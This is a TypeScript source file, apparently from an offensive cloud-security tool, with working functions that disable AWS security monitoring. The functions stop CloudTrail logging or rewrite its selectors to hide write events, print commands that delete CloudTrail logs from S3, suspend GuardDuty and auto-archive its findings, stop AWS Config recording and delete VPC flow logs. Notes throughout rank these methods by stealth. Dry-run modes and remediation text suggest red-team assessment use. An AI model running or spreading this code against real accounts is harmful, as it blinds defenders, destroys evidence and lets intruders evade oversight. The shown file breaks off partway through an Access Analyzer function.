import { aws, argVal, hasFlag, tryJson } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function cloudtrailBlind(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action")
  if (!action) return { output: "ERROR: --action required (stop|delete_logs|modify_selectors|status)", findings: [] }
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const trailName = argVal(args, "--trail-name")
  const execute = hasFlag(args, "--execute")
  const findings: Finding[] = []
  const output: string[] = ["[*] CloudTrail Blind — Logging Disruption\n"]

  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
  if (id.exitCode !== 0) return { output: `[-] No valid credentials: ${id.stderr.trim()}`, findings }
  const identity = tryJson(id.stdout) || {}
  const callerArn = (identity.Arn || "") as string
  output.push(`[+] Identity: ${callerArn}`)

  const actions = ["cloudtrail:DescribeTrails", "cloudtrail:GetTrailStatus", "cloudtrail:StopLogging", "cloudtrail:PutEventSelectors"]
  const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...actions], profile, region, timeout)
  const results = tryJson(sim.stdout)?.EvaluationResults || []
  const allowed = new Set((results as Record<string, string>[]).filter(r => r.EvalDecision === "allowed").map(r => r.EvalActionName))

  output.push(`\n[*] Pre-flight permission check:`)
  for (const a of actions) output.push(`  ${allowed.has(a) ? "[+] ALLOWED" : "[-] DENIED"}: ${a}`)

  output.push(`\n[*] CloudTrail events: StopLogging, PutEventSelectors, DeleteTrail`)
  output.push(`[*] GuardDuty: Stealth:IAMUser/CloudTrailLoggingDisabled (HIGH)`)

  const r = await aws(["cloudtrail", "describe-trails"], profile, region, timeout)
  if (r.exitCode !== 0) return { output: output.join("\n") + `\n[-] Cannot describe trails: ${r.stderr.trim()}`, findings }
  const trails = tryJson(r.stdout)?.trailList || []
  output.push(`\n[+] Trails: ${trails.length}`)

  for (const t of trails as Record<string, unknown>[]) {
    const status = await aws(["cloudtrail", "get-trail-status", "--name", t.Name as string], profile, region, timeout)
    const s = tryJson(status.stdout)
    const isOrg = t.IsOrganizationTrail === true
    const isMulti = t.IsMultiRegionTrail === true
    output.push(`\n  ${t.Name}: logging=${s?.IsLogging} multi-region=${isMulti} org=${isOrg} bucket=${t.S3BucketName}`)
    if (t.CloudWatchLogsLogGroupArn) output.push(`    CloudWatch: ${t.CloudWatchLogsLogGroupArn} — alarm may trigger on disable`)
    if (t.SnsTopicARN) output.push(`    SNS: ${t.SnsTopicARN} — notifications active`)
    if (isOrg) output.push(`    [!] Organization trail — cannot stop from member account`)
    if (t.KmsKeyId) output.push(`    KMS: ${t.KmsKeyId}`)

    const sel = await aws(["cloudtrail", "get-event-selectors", "--trail-name", t.Name as string], profile, region, timeout)
    if (sel.exitCode === 0) {
      const selData = tryJson(sel.stdout)
      const selectors = selData?.EventSelectors || []
      for (const es of selectors as Record<string, unknown>[]) {
        output.push(`    Selectors: ReadWrite=${es.ReadWriteType} MgmtEvents=${es.IncludeManagementEvents}`)
        const excludes = (es.ExcludeManagementEventSources || []) as string[]
        if (excludes.length > 0) output.push(`    Excluded sources: ${excludes.join(", ")}`)
        const dataRes = (es.DataResources || []) as Record<string, unknown>[]
        if (dataRes.length > 0) output.push(`    Data resources: ${dataRes.map(d => d.Type).join(", ")}`)
      }
    }
  }

  if (action === "status") {
    const viable: string[] = []
    if (allowed.has("cloudtrail:StopLogging")) viable.push("stop")
    if (allowed.has("cloudtrail:PutEventSelectors")) viable.push("modify_selectors")
    viable.push("delete_logs (S3 access needed separately)")
    output.push(`\n[*] Viable actions: ${viable.join(", ")}`)
    output.push(`[*] Use --action stop|modify_selectors|delete_logs [--trail-name <name>] [--execute]`)
    return { output: output.join("\n"), findings }
  }

  if (action === "stop") {
    if (!allowed.has("cloudtrail:StopLogging")) {
      output.push(`\n[-] cloudtrail:StopLogging DENIED — vector blocked`)
      findings.push({ checkId: "AWS-EVASION-CT-001", provider: "aws", severity: "info", status: "BLOCKED", resource: `iam://${callerArn}`, title: "CloudTrail stop-logging blocked — insufficient permissions", details: "Cannot stop CloudTrail logging", remediation: "N/A" })
      return { output: output.join("\n"), findings }
    }
    const name = trailName || (trails[0] as Record<string, string>)?.Name
    if (!name) return { output: output.join("\n") + "\n[-] No trail found", findings }
    const isOrg = (trails as Record<string, unknown>[]).find(t => t.Name === name)?.IsOrganizationTrail === true
    if (isOrg) {
      output.push(`\n[!] ${name} is an organization trail — StopLogging will fail from member account`)
      findings.push({ checkId: "AWS-EVASION-CT-002", provider: "aws", severity: "info", status: "BLOCKED", resource: `cloudtrail://${name}`, title: `Organization trail cannot be stopped: ${name}`, details: "Only the management account or delegated admin can stop an organization trail", remediation: "Target non-org trails or escalate to management account" })
    }
    if (!execute) {
      output.push(`\n[+] DRY RUN — would stop logging on: ${name}`)
      output.push(`[*] Run with --execute to perform`)
      findings.push({ checkId: "AWS-EVASION-CT-003", provider: "aws", severity: "critical", status: "READY", resource: `cloudtrail://${name}`, title: `CloudTrail stop-logging viable: ${name}`, details: `Identity can StopLogging — trail will go dark`, remediation: "Restrict cloudtrail:StopLogging via SCP, enable CloudWatch alarm on StatusNotification" })
      return { output: output.join("\n"), findings }
    }
    const stop = await aws(["cloudtrail", "stop-logging", "--name", name], profile, region, timeout)
    if (stop.exitCode === 0) {
      output.push(`\n[+] Stopped logging on trail: ${name}`)
      findings.push({ checkId: "AWS-EVASION-CT-003", provider: "aws", severity: "critical", status: "DISABLED", resource: `cloudtrail://${name}`, title: `CloudTrail logging stopped: ${name}`, details: "All API activity no longer recorded — GuardDuty will fire Stealth:IAMUser/CloudTrailLoggingDisabled", remediation: `Restart: aws cloudtrail start-logging --name ${name}` })
    } else {
      output.push(`\n[-] Stop failed: ${stop.stderr.trim()}`)
    }
    return { output: output.join("\n"), findings }
  }

  if (action === "modify_selectors") {
    if (!allowed.has("cloudtrail:PutEventSelectors")) {
      output.push(`\n[-] cloudtrail:PutEventSelectors DENIED — vector blocked`)
      findings.push({ checkId: "AWS-EVASION-CT-004", provider: "aws", severity: "info", status: "BLOCKED", resource: `iam://${callerArn}`, title: "CloudTrail selector modification blocked", details: "Cannot modify event selectors", remediation: "N/A" })
      return { output: output.join("\n"), findings }
    }
    const name = trailName || (trails[0] as Record<string, string>)?.Name
    if (!name) return { output: output.join("\n") + "\n[-] No trail found", findings }
    if (!execute) {
      output.push(`\n[+] DRY RUN — would modify selectors on: ${name}`)
      output.push(`    Set ReadWriteType=ReadOnly, IncludeManagementEvents=false`)
      output.push(`    Effect: write operations (Create*, Delete*, Put*, Update*) become invisible`)
      output.push(`[*] Run with --execute to perform`)
      findings.push({ checkId: "AWS-EVASION-CT-005", provider: "aws", severity: "critical", status: "READY", resource: `cloudtrail://${name}`, title: `CloudTrail selector tampering viable: ${name}`, details: "Can exclude management write events — stealthier than full stop", remediation: "Monitor PutEventSelectors in CloudTrail, use SCP to deny" })
      return { output: output.join("\n"), findings }
    }
    const mod = await aws(["cloudtrail", "put-event-selectors", "--trail-name", name, "--event-selectors", '[{"ReadWriteType":"ReadOnly","IncludeManagementEvents":false}]'], profile, region, timeout)
    if (mod.exitCode === 0) {
      output.push(`\n[+] Event selectors modified on ${name} — management write events excluded`)
      findings.push({ checkId: "AWS-EVASION-CT-005", provider: "aws", severity: "critical", status: "MODIFIED", resource: `cloudtrail://${name}`, title: `CloudTrail selectors tampered: ${name}`, details: "Management write events no longer logged — stealthier than StopLogging (no GuardDuty alert for this)", remediation: `Restore: aws cloudtrail put-event-selectors --trail-name ${name} --event-selectors '[{"ReadWriteType":"All","IncludeManagementEvents":true}]'` })
    } else {
      output.push(`\n[-] Failed: ${mod.stderr.trim()}`)
    }
    return { output: output.join("\n"), findings }
  }

  if (action === "delete_logs") {
    const bucket = (trails[0] as Record<string, string>)?.S3BucketName
    if (!bucket) return { output: output.join("\n") + "\n[-] Cannot find CloudTrail S3 bucket", findings }
    output.push(`\n[*] CloudTrail logs in: s3://${bucket}`)
    output.push(`[+] Deletion commands:`)
    output.push(`  aws s3 rm s3://${bucket}/AWSLogs/ --recursive`)
    output.push(`  aws s3api delete-objects --bucket ${bucket} --delete "$(aws s3api list-object-versions --bucket ${bucket} --prefix AWSLogs/ --query '{Objects: Versions[].{Key:Key,VersionId:VersionId}}' --output json)"`)
    output.push(`\n[*] Note: bucket policy/ACL or MFA-delete may block deletion`)
    output.push(`[*] Versioned buckets require version-aware delete`)
    findings.push({ checkId: "AWS-EVASION-CT-006", provider: "aws", severity: "high", status: "INFO", resource: `s3://${bucket}`, title: `CloudTrail log bucket identified: ${bucket}`, details: "S3 bucket contains CloudTrail logs — delete requires s3:DeleteObject on bucket", remediation: "Enable MFA delete, bucket versioning, and Object Lock on CloudTrail buckets" })
    return { output: output.join("\n"), findings }
  }

  output.push(`\n[*] Detection:`)
  output.push(`  CloudTrail: StopLogging, PutEventSelectors, DeleteTrail, DescribeTrails, GetTrailStatus`)
  output.push(`  GuardDuty: Stealth:IAMUser/CloudTrailLoggingDisabled (HIGH — fires on StopLogging)`)
  output.push(`  OPSEC: StopLogging itself is logged BEFORE logging stops — always visible retroactively`)
  output.push(`  OPSEC: PutEventSelectors does NOT trigger GuardDuty — stealthier than StopLogging`)
  output.push(`  OPSEC: S3 log deletion visible via S3 data events if a second trail captures them`)

  return { output: output.join("\n") + `\nERROR: Unknown action: ${action}`, findings }
}

export async function guarddutyEvade(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "status"
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const execute = hasFlag(args, "--execute")
  const output: string[] = ["[*] GuardDuty Evasion\n"]
  const findings: Finding[] = []

  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
  if (id.exitCode !== 0) return { output: `[-] No valid credentials: ${id.stderr.trim()}`, findings }
  const callerArn = (tryJson(id.stdout)?.Arn || "") as string
  output.push(`[+] Identity: ${callerArn}`)

  const actions = ["guardduty:ListDetectors", "guardduty:GetDetector", "guardduty:UpdateDetector", "guardduty:CreateFilter", "guardduty:ArchiveFindings", "guardduty:ListFindings"]
  const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...actions], profile, region, timeout)
  const results = tryJson(sim.stdout)?.EvaluationResults || []
  const allowed = new Set((results as Record<string, string>[]).filter(r => r.EvalDecision === "allowed").map(r => r.EvalActionName))

  output.push(`\n[*] Pre-flight permission check:`)
  for (const a of actions) output.push(`  ${allowed.has(a) ? "[+] ALLOWED" : "[-] DENIED"}: ${a}`)

  output.push(`\n[*] CloudTrail events: UpdateDetector, CreateFilter, ArchiveFindings`)
  output.push(`[*] GuardDuty: meta-evasion — disabling the tool that detects evasion`)
  output.push(`[*] Note: org-managed detectors cannot be modified from member accounts`)

  const detectors = await aws(["guardduty", "list-detectors", "--query", "DetectorIds"], profile, region, timeout)
  if (detectors.exitCode !== 0) return { output: output.join("\n") + `\n[-] Cannot list detectors: ${detectors.stderr.trim()}`, findings }

  const dl = tryJson(detectors.stdout) || []
  output.push(`\n[+] GuardDuty Detectors: ${dl.length}`)

  for (const detectorId of dl) {
    const desc = await aws(["guardduty", "get-detector", "--detector-id", detectorId], profile, region, timeout)
    if (desc.exitCode === 0) {
      const det = tryJson(desc.stdout) || {}
      output.push(`\n  ${detectorId} — status: ${det.Status} — updated: ${det.UpdatedAt}`)
      const features = det.Features || []
      for (const f of features as Record<string, string>[]) output.push(`    ${f.Name}: ${f.Status}`)
      if (det.FindingPublishingFrequency) output.push(`    Publishing: ${det.FindingPublishingFrequency}`)

      const admin = await aws(["guardduty", "get-administrator-account", "--detector-id", detectorId], profile, region, timeout)
      if (admin.exitCode === 0) {
        const adm = tryJson(admin.stdout)?.Administrator
        if (adm?.AccountId) {
          output.push(`    [!] Org-managed by admin: ${adm.AccountId} (${adm.RelationshipStatus}) — suspend may be blocked`)
        }
      }

      const existing = await aws(["guardduty", "list-filters", "--detector-id", detectorId, "--query", "FilterNames"], profile, region, timeout)
      if (existing.exitCode === 0) {
        const ef = tryJson(existing.stdout) || []
        if (ef.length > 0) output.push(`    Existing filters: ${ef.join(", ")}`)
      }
    }

    if (action === "suspend") {
      if (!allowed.has("guardduty:UpdateDetector")) {
        output.push(`    [-] guardduty:UpdateDetector DENIED — suspend blocked`)
        findings.push({ checkId: "AWS-EVASION-GD-001", provider: "aws", severity: "info", status: "BLOCKED", resource: `guardduty:${detectorId}`, title: "GuardDuty suspend blocked — insufficient permissions", details: "Cannot disable GuardDuty detector", remediation: "N/A" })
        continue
      }
      if (!execute) {
        output.push(`    [+] DRY RUN — would suspend detector: ${detectorId}`)
        findings.push({ checkId: "AWS-EVASION-001", provider: "aws", severity: "critical", status: "READY", resource: `guardduty:${detectorId}`, title: `GuardDuty suspend viable: ${detectorId}`, details: "UpdateDetector permission confirmed — detector can be disabled", remediation: "Restrict guardduty:UpdateDetector via SCP" })
        continue
      }
      const r = await aws(["guardduty", "update-detector", "--detector-id", detectorId, "--no-enable"], profile, region, timeout)
      if (r.exitCode === 0) {
        output.push(`    [+] Detector ${detectorId} SUSPENDED`)
        findings.push({ checkId: "AWS-EVASION-001", provider: "aws", severity: "critical", status: "DISABLED", resource: `guardduty:${detectorId}`, title: `GuardDuty detector suspended: ${detectorId}`, details: "GuardDuty threat detection disabled — CloudTrail event: UpdateDetector", remediation: "Re-enable: aws guardduty update-detector --detector-id " + detectorId + " --enable" })
      } else {
        output.push(`    [-] Suspend failed: ${r.stderr.trim()}`)
      }
    }

    if (action === "suppress") {
      if (!allowed.has("guardduty:ArchiveFindings")) {
        output.push(`    [-] guardduty:ArchiveFindings DENIED — suppress blocked`)
        findings.push({ checkId: "AWS-EVASION-GD-002", provider: "aws", severity: "info", status: "BLOCKED", resource: `guardduty:${detectorId}`, title: "GuardDuty finding suppression blocked", details: "Cannot archive findings", remediation: "N/A" })
        continue
      }
      const gdFindings = await aws(["guardduty", "list-findings", "--detector-id", detectorId, "--finding-criteria", '{"Criterion":{"severity":{"Gte":7}}}'], profile, region, timeout)
      if (gdFindings.exitCode === 0) {
        const fl = tryJson(gdFindings.stdout)?.FindingIds || []
        output.push(`\n    [+] High-severity findings: ${fl.length}`)
        if (fl.length > 0) {
          if (!execute) {
            output.push(`    [+] DRY RUN — would archive ${Math.min(fl.length, 50)} finding(s)`)
            findings.push({ checkId: "AWS-EVASION-002", provider: "aws", severity: "high", status: "READY", resource: `guardduty:${detectorId}`, title: `GuardDuty finding suppression viable: ${fl.length} findings`, details: "ArchiveFindings permission confirmed", remediation: "Restrict guardduty:ArchiveFindings" })
            continue
          }
          const archive = await aws(["guardduty", "archive-findings", "--detector-id", detectorId, "--finding-ids", ...fl.slice(0, 50)], profile, region, timeout)
          if (archive.exitCode === 0) {
            output.push(`    [+] Archived ${Math.min(fl.length, 50)} finding(s)`)
            findings.push({ checkId: "AWS-EVASION-002", provider: "aws", severity: "high", status: "SUPPRESSED", resource: `guardduty:${detectorId}`, title: `GuardDuty findings archived: ${Math.min(fl.length, 50)}`, details: "High-severity findings archived to hide activity — CloudTrail event: ArchiveFindings", remediation: "Unarchive findings and review for legitimate threats" })
          }
        }
      }
    }

    if (action === "filter") {
      if (!allowed.has("guardduty:CreateFilter")) {
        output.push(`    [-] guardduty:CreateFilter DENIED — filter creation blocked`)
        findings.push({ checkId: "AWS-EVASION-GD-003", provider: "aws", severity: "info", status: "BLOCKED", resource: `guardduty:${detectorId}`, title: "GuardDuty filter creation blocked", details: "Cannot create auto-archive filter", remediation: "N/A" })
        continue
      }
      if (!execute) {
        output.push(`    [+] DRY RUN — would create auto-archive filter on: ${detectorId}`)
        output.push(`    Effect: all future findings auto-archived (severity >= 1)`)
        findings.push({ checkId: "AWS-EVASION-003", provider: "aws", severity: "critical", status: "READY", resource: `guardduty:${detectorId}:filter`, title: "GuardDuty auto-archive filter viable", details: "CreateFilter permission confirmed — all future findings will be hidden", remediation: "Restrict guardduty:CreateFilter via SCP" })
        continue
      }
      const filter = await aws(["guardduty", "create-filter", "--detector-id", detectorId, "--name", "cs-suppress-all", "--action", "ARCHIVE", "--finding-criteria", '{"Criterion":{"severity":{"Gte":1}}}', "--tags", "CreatedBy=CyberStrike"], profile, region, timeout)
      if (filter.exitCode === 0) {
        output.push(`    [+] Auto-archive filter created: cs-suppress-all`)
        findings.push({ checkId: "AWS-EVASION-003", provider: "aws", severity: "critical", status: "CREATED", resource: `guardduty:${detectorId}:filter`, title: "GuardDuty auto-archive filter created", details: "All future findings will be automatically archived — CloudTrail event: CreateFilter", remediation: "Delete filter: aws guardduty delete-filter --detector-id " + detectorId + " --filter-name cs-suppress-all" })
      } else {
        output.push(`    [-] Filter creation failed: ${filter.stderr.trim()}`)
      }
    }
  }

  if (action === "status") {
    const viable: string[] = []
    if (allowed.has("guardduty:UpdateDetector")) viable.push("suspend")
    if (allowed.has("guardduty:ArchiveFindings")) viable.push("suppress")
    if (allowed.has("guardduty:CreateFilter")) viable.push("filter")
    output.push(`\n[*] Viable actions: ${viable.length > 0 ? viable.join(", ") : "NONE — all evasion vectors blocked"}`)
    output.push(`[*] Use --action suspend|suppress|filter [--execute]`)
  }

  output.push(`\n[*] Detection:`)
  output.push(`  CloudTrail: UpdateDetector, CreateFilter, DeleteFilter, ArchiveFindings, ListDetectors, GetDetector`)
  output.push(`  GuardDuty: meta-irony — UpdateDetector with enable=false fires a finding BEFORE the detector is disabled`)
  output.push(`  OPSEC: suspend is NOISIEST (GuardDuty fires + org admin notified); filter is stealthiest (auto-archive, no alert)`)
  output.push(`  OPSEC: ArchiveFindings is moderate signal — bulk archive of high-severity findings is suspicious in audit`)
  output.push(`  OPSEC: org-managed detectors cannot be suspended from member account — escalation required`)

  return { output: output.join("\n"), findings }
}

export async function configDisable(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "status"
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const execute = hasFlag(args, "--execute")
  const output: string[] = ["[*] AWS Config Recorder — Compliance Evasion\n"]
  const findings: Finding[] = []

  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
  if (id.exitCode !== 0) return { output: `[-] No valid credentials: ${id.stderr.trim()}`, findings }
  const callerArn = (tryJson(id.stdout)?.Arn || "") as string
  output.push(`[+] Identity: ${callerArn}`)

  const actions = ["config:DescribeConfigurationRecorders", "config:StopConfigurationRecorder", "config:DeleteDeliveryChannel", "config:DescribeDeliveryChannels"]
  const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...actions], profile, region, timeout)
  const results = tryJson(sim.stdout)?.EvaluationResults || []
  const allowed = new Set((results as Record<string, string>[]).filter(r => r.EvalDecision === "allowed").map(r => r.EvalActionName))

  output.push(`\n[*] Pre-flight permission check:`)
  for (const a of actions) output.push(`  ${allowed.has(a) ? "[+] ALLOWED" : "[-] DENIED"}: ${a}`)

  output.push(`\n[*] CloudTrail events: StopConfigurationRecorder, DeleteDeliveryChannel`)
  output.push(`[*] Detection: AWS Config rule noncompliant state, CloudWatch alarm on recorder status`)

  const recorders = await aws(["configservice", "describe-configuration-recorders"], profile, region, timeout)
  if (recorders.exitCode !== 0) return { output: output.join("\n") + `\n[-] Cannot describe recorders: ${recorders.stderr.trim()}`, findings }

  const rl = tryJson(recorders.stdout)?.ConfigurationRecorders || []
  output.push(`\n[+] Configuration Recorders: ${rl.length}`)

  for (const rec of rl as Record<string, unknown>[]) {
    const status = await aws(["configservice", "describe-configuration-recorder-status", "--configuration-recorder-names", rec.name as string], profile, region, timeout)
    const s = tryJson(status.stdout)?.ConfigurationRecordersStatus?.[0]
    output.push(`\n  ${rec.name} — recording: ${s?.recording} — last status: ${s?.lastStatus}`)
    const group = rec.recordingGroup as Record<string, unknown> | undefined
    if (group) {
      output.push(`    All resources: ${group.allSupported} — global: ${group.includeGlobalResourceTypes}`)
      const specific = group.resourceTypes as string[] | undefined
      if (specific?.length) output.push(`    Specific types: ${specific.slice(0, 10).join(", ")}${specific.length > 10 ? ` (+${specific.length - 10} more)` : ""}`)
    }
    const roleArn = rec.roleARN as string | undefined
    if (roleArn) output.push(`    Role: ${roleArn}`)

    if (action === "stop") {
      if (!allowed.has("config:StopConfigurationRecorder")) {
        output.push(`    [-] config:StopConfigurationRecorder DENIED — blocked`)
        findings.push({ checkId: "AWS-EVASION-CFG-001", provider: "aws", severity: "info", status: "BLOCKED", resource: `config:${rec.name}`, title: "Config recorder stop blocked", details: "Cannot stop AWS Config recording", remediation: "N/A" })
        continue
      }
      if (!execute) {
        output.push(`    [+] DRY RUN — would stop recorder: ${rec.name}`)
        findings.push({ checkId: "AWS-EVASION-004", provider: "aws", severity: "critical", status: "READY", resource: `config:${rec.name}`, title: `Config recorder stop viable: ${rec.name}`, details: "StopConfigurationRecorder permission confirmed — resource changes will go untracked", remediation: "Restrict config:StopConfigurationRecorder via SCP" })
        continue
      }
      const r = await aws(["configservice", "stop-configuration-recorder", "--configuration-recorder-name", rec.name as string], profile, region, timeout)
      if (r.exitCode === 0) {
        output.push(`    [+] Recorder stopped: ${rec.name}`)
        findings.push({ checkId: "AWS-EVASION-004", provider: "aws", severity: "critical", status: "DISABLED", resource: `config:${rec.name}`, title: `AWS Config recorder stopped: ${rec.name}`, details: "Configuration recording disabled — resource changes will not be tracked. CloudTrail event: StopConfigurationRecorder", remediation: "Restart: aws configservice start-configuration-recorder --configuration-recorder-name " + rec.name })
      } else {
        output.push(`    [-] Stop failed: ${r.stderr.trim()}`)
      }
    }
  }

  const channels = await aws(["configservice", "describe-delivery-channels"], profile, region, timeout)
  if (channels.exitCode === 0) {
    const cl = tryJson(channels.stdout)?.DeliveryChannels || []
    output.push(`\n[+] Delivery Channels: ${cl.length}`)
    for (const ch of cl as Record<string, string>[]) {
      output.push(`  ${ch.name} — bucket: ${ch.s3BucketName} — SNS: ${ch.snsTopicARN || "none"}`)
      if (action === "delete_channel") {
        if (!allowed.has("config:DeleteDeliveryChannel")) {
          output.push(`    [-] config:DeleteDeliveryChannel DENIED — blocked`)
          continue
        }
        if (!execute) {
          output.push(`    [+] DRY RUN — would delete channel: ${ch.name}`)
          findings.push({ checkId: "AWS-EVASION-CFG-002", provider: "aws", severity: "critical", status: "READY", resource: `config:channel:${ch.name}`, title: `Config delivery channel deletion viable: ${ch.name}`, details: `Config snapshots to ${ch.s3BucketName} will stop`, remediation: "Restrict config:DeleteDeliveryChannel via SCP" })
          continue
        }
        const r = await aws(["configservice", "delete-delivery-channel", "--delivery-channel-name", ch.name], profile, region, timeout)
        if (r.exitCode === 0) {
          output.push(`    [+] Channel deleted: ${ch.name}`)
          findings.push({ checkId: "AWS-EVASION-CFG-002", provider: "aws", severity: "critical", status: "DELETED", resource: `config:channel:${ch.name}`, title: `Config delivery channel deleted: ${ch.name}`, details: `Config snapshots to ${ch.s3BucketName} stopped. CloudTrail event: DeleteDeliveryChannel`, remediation: "Recreate delivery channel with same S3/SNS config" })
        }
      }
    }
  }

  const agg = await aws(["configservice", "describe-configuration-aggregators", "--query", "ConfigurationAggregators[].[ConfigurationAggregatorName,ConfigurationAggregatorArn]"], profile, region, timeout)
  if (agg.exitCode === 0) {
    const al = tryJson(agg.stdout) || []
    if (al.length > 0) {
      output.push(`\n[+] Config Aggregators: ${al.length}`)
      for (const a of al) output.push(`  ${a[0]}`)
      output.push(`  [!] Aggregator present — centralized team may detect recorder stop`)
    }
  }

  if (action === "status") {
    const viable: string[] = []
    if (allowed.has("config:StopConfigurationRecorder")) viable.push("stop")
    if (allowed.has("config:DeleteDeliveryChannel")) viable.push("delete_channel")
    output.push(`\n[*] Viable actions: ${viable.length > 0 ? viable.join(", ") : "NONE"}`)
    output.push(`[*] Use --action stop|delete_channel [--execute]`)
  }

  return { output: output.join("\n"), findings }
}

export async function vpcFlowDisable(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "status"
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const execute = hasFlag(args, "--execute")
  const output: string[] = ["[*] VPC Flow Logs — Network Evidence Destruction\n"]
  const findings: Finding[] = []

  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
  if (id.exitCode !== 0) return { output: `[-] No valid credentials: ${id.stderr.trim()}`, findings }
  const callerArn = (tryJson(id.stdout)?.Arn || "") as string
  output.push(`[+] Identity: ${callerArn}`)

  const simActions = ["ec2:DescribeFlowLogs", "ec2:DeleteFlowLogs"]
  const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...simActions], profile, region, timeout)
  const results = tryJson(sim.stdout)?.EvaluationResults || []
  const allowed = new Set((results as Record<string, string>[]).filter(r => r.EvalDecision === "allowed").map(r => r.EvalActionName))

  output.push(`\n[*] Pre-flight permission check:`)
  for (const a of simActions) output.push(`  ${allowed.has(a) ? "[+] ALLOWED" : "[-] DENIED"}: ${a}`)

  output.push(`\n[*] CloudTrail events: DeleteFlowLogs`)
  output.push(`[*] GuardDuty impact: GuardDuty uses VPC Flow Logs for network-based findings (PortProbe, DDoS, UnauthorizedAccess)`)

  const flowLogs = await aws(["ec2", "describe-flow-logs", "--query", "FlowLogs[].[FlowLogId,ResourceId,LogDestinationType,LogDestination,FlowLogStatus,TrafficType,MaxAggregationInterval,Tags]"], profile, region, timeout)
  if (flowLogs.exitCode !== 0) return { output: output.join("\n") + `\n[-] Cannot describe flow logs: ${flowLogs.stderr.trim()}`, findings }

  const fl = tryJson(flowLogs.stdout) || []
  output.push(`\n[+] VPC Flow Logs: ${fl.length}`)

  const destTypes: Record<string, number> = {}
  for (const f of fl as unknown[][]) {
    output.push(`\n  ${f[0]} — ${f[1]} → ${f[2]}:${f[3]}`)
    output.push(`    Status: ${f[4]} Traffic: ${f[5]} Interval: ${f[6]}s`)
    const dtype = (f[2] || "unknown") as string
    destTypes[dtype] = (destTypes[dtype] || 0) + 1
  }

  output.push(`\n[+] Destination summary: ${Object.entries(destTypes).map(([k, v]) => `${k}=${v}`).join(", ")}`)
  if (destTypes["cloud-watch-logs"]) output.push(`  [!] ${destTypes["cloud-watch-logs"]} flow log(s) go to CloudWatch — also check cloudwatch_tamper`)
  if (destTypes["s3"]) output.push(`  [!] ${destTypes["s3"]} flow log(s) go to S3 — historical data persists even after deletion`)

  if (action === "delete") {
    if (!allowed.has("ec2:DeleteFlowLogs")) {
      output.push(`\n[-] ec2:DeleteFlowLogs DENIED — vector blocked`)
      findings.push({ checkId: "AWS-EVASION-VPC-001", provider: "aws", severity: "info", status: "BLOCKED", resource: `iam://${callerArn}`, title: "VPC flow log deletion blocked", details: "Cannot delete flow logs", remediation: "N/A" })
      return { output: output.join("\n"), findings }
    }
    for (const f of fl as unknown[][]) {
      if (!execute) {
        output.push(`  [+] DRY RUN — would delete: ${f[0]} (${f[1]})`)
        continue
      }
      const r = await aws(["ec2", "delete-flow-logs", "--flow-log-ids", f[0] as string], profile, region, timeout)
      if (r.exitCode === 0) {
        output.push(`  [+] Deleted: ${f[0]}`)
        findings.push({ checkId: "AWS-EVASION-005", provider: "aws", severity: "critical", status: "DELETED", resource: `vpc:flowlog:${f[0]}`, title: `VPC Flow Log deleted: ${f[0]}`, details: `Flow log for ${f[1]} deleted — network traffic no longer logged. CloudTrail event: DeleteFlowLogs`, remediation: "Recreate flow log for VPC/subnet/ENI" })
      } else {
        output.push(`  [-] Delete failed for ${f[0]}: ${r.stderr.trim()}`)
      }
    }
    if (!execute) {
      findings.push({ checkId: "AWS-EVASION-005", provider: "aws", severity: "critical", status: "READY", resource: `vpc:flowlogs:${fl.length}`, title: `VPC flow log deletion viable: ${fl.length} flow logs`, details: "DeleteFlowLogs permission confirmed — all network evidence can be destroyed", remediation: "Restrict ec2:DeleteFlowLogs via SCP, use org-level flow log enforcement" })
    }
  }

  if (action === "status") {
    output.push(`\n[*] Viable: ${allowed.has("ec2:DeleteFlowLogs") ? "delete" : "NONE — deletion blocked"}`)
    output.push(`[*] Use --action delete [--execute]`)
  }

  output.push(`\n[*] Detection:`)
  output.push(`  CloudTrail: DescribeFlowLogs, DeleteFlowLogs`)
  output.push(`  GuardDuty: N/A — no specific finding for flow log deletion, but GuardDuty uses flow logs for network-based detections`)
  output.push(`  OPSEC: DeleteFlowLogs is HIGH signal — most orgs have Config rules or Security Hub checks for missing flow logs`)
  output.push(`  OPSEC: deleting the flow log stops NEW logs — existing S3/CloudWatch logs persist and contain historical evidence`)

  return { output: output.join("\n"), findings }
}

export async function accessAnalyzerSuppress(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "status"
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const execute = hasFlag(args, "--execute")
  const output: string[] = ["[*] IAM Access Analyzer — External Access Evasion\n"]
  const findings: Finding[] = []

  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
  if (id.exitCode !== 0) return { output: `[-] No valid credentials: ${id.stderr.trim()}`, findings }
  const callerArn = (tryJson(id.stdout)?.Arn || "") as string
  output.push(`[+] Identity: ${callerArn}`)

  const simActions = ["access-analyzer:ListAnalyzers", "access-analyzer:ListFindings", "access-analyzer:UpdateFindings", "access-analyzer:DeleteAnalyzer"]
  const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...simActions], profile, region, timeout)
  const results = tryJson(sim.stdout)?.EvaluationResults || []
  const allowed = new Set((results as Record<string, string>[]).filter(r => r.EvalDecision === "allowed").map(r => r.EvalActionName))

  output.push(`\n[*] Pre-flight permission check:`)
  for (const a of simActions) output.push(`  ${allowed.has(a) ? "[+] ALLOWED" : "[-] DENIED"}: ${a}`)

  output.push(`\n[*] CloudTrail events: UpdateFindings, DeleteAnalyzer`)
